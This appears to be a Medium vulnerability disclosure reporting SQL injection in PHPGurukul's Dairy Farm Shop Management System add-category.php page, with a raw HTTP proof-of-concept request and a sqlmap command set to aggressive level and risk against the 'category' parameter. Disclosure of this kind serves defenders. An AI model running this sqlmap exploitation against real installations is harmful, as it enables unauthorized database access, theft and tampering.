=== Content from medium.com_0c44ae7a_20250114_200549.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fe9cfbc375be8&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fdfsms-has-sql-injection-vulnerability-e9cfbc375be8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fdfsms-has-sql-injection-vulnerability-e9cfbc375be8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# DFSMS has SQL injection vulnerability

[![heishou](https://miro.medium.com/v2/resize:fill:88:88/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---byline--e9cfbc375be8--------------------------------)

[heishou](/%40heishou?source=post_page---byline--e9cfbc375be8--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffc1fddf341cd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Fdfsms-has-sql-injection-vulnerability-e9cfbc375be8&user=heishou&userId=fc1fddf341cd&source=post_page-fc1fddf341cd--byline--e9cfbc375be8---------------------post_header-----------)

2 min read·Jan 7, 2024

--

Listen

Share

Manufacturer information:
<https://phpgurukul.com/>

Affected versions:<=1.1

download link:

<https://phpgurukul.com/wp-content/uploads/2019/12/Dairy-Farm-Shop-Management-System-Project-1.zip>

Environment setup:

![]()

Code analysis:

![]()

This code directly embeds the user input ($catname and $catcode) received via the POST method into the SQL query. This is a classic sign of a SQL injection vulnerability, as it does not use parameterized queries or proper data cleaning to protect against malicious input. When an attacker has control over these inputs, they may construct special input values ​​that cause the original SQL statement to be altered or expanded, thereby performing unauthorized database operations. This could include data theft, data tampering or even performing other malicious actions.

POC：

```
POST /Dairy/dfsms/add-category.php HTTP/1.1
Host: localhost
Content-Length: 35
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Dairy/dfsms/add-category.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.; PHPSESSID=1vde0nhrn5t29cbigj2ice462r
Connection: close
category=aa&categorycode=bb&submit=
```

Sqlamp:

python sqlmap.py -r 2.txt — level 5 — risk 3 -p category

![]()

--

--

[![heishou](https://miro.medium.com/v2/resize:fill:96:96/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--e9cfbc375be8--------------------------------)[![heishou](https://miro.medium.com/v2/resize:fill:128:128/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--e9cfbc375be8--------------------------------)Follow[## Written by heishou](/%40heishou?source=post_page---post_author_info--e9cfbc375be8--------------------------------)[1 Follower](/%40heishou/followers?source=post_page---post_author_info--e9cfbc375be8--------------------------------)·[3 Following](/%40heishou/following?source=post_page---post_author_info--e9cfbc375be8--------------------------------)

Pretending to make you fly

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----e9cfbc375be8--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----e9cfbc375be8--------------------------------)[About](/about?autoplay=1&source=post_page-----e9cfbc375be8--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----e9cfbc375be8--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----e9cfbc375be8--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----e9cfbc375be8--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----e9cfbc375be8--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----e9cfbc375be8--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----e9cfbc375be8--------------------------------)[Teams](/business?source=post_page-----e9cfbc375be8--------------------------------)


